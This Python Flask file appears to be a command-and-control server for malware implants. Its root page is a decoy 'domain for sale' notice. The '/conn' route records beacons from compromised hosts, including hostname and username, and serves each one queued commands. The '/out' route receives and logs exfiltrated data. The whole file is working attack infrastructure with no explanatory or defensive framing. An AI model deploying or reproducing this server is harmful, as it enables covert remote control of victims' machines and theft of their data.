from datetime import datetime
from flask import Flask


app = Flask(__name__)
port = 80
iface = "0.0.0.0"


@app.route('/')
def root_dir():
    return_string = "Domain available for puchase <br \> <br \> Email     'administrator@nonewideas.com'     for more info"

    return return_string


@app.route('/conn/<hostname>/<username>')
@app.route('/conn/<hostname>/<username>/')
def new_connection(hostname, username):
    log_file = open("logs/" + hostname + ".txt", "a")

    cmd_file = open("cmds/" + hostname + ".txt", "a").close()
    cmd_file = open("cmds/" + hostname + ".txt", "r+")

    command = cmd_file.readline()
    time = str(datetime.now())

    print('[+] Beacon from: ', hostname, ' as ', username)
    log_file.writelines(time + ' [+] Beacon from: ' + hostname + ' as ' + username + '\n')

    if command != '':
        print('[+] Command sent: ', command)
        log_file.writelines(time + ' [+] Command sent: "' + command + '"\n')
        cmd_file.truncate(0)
    else:
        pass

    cmd_file.close()
    log_file.close()

    return command


@app.route('/out/<hostname>/<exfil>')
@app.route('/out/<hostname>/<exfil>/')
def exfil_data(hostname, exfil):
    log_file = open("logs/" + hostname + ".txt", 'a')
    return_string = ''
    time = str(datetime.now())

    print(' [i] Response from ', hostname, ": ", exfil)
    log_file.writelines(time + ' [i] Response from ' + hostname + ": " + exfil + '\n')

    log_file.close()

    return return_string


def start_server():
    app.run(host = iface, debug=False, port=port)


if __name__ == '__main__':
    app.run(debug=True, port=port)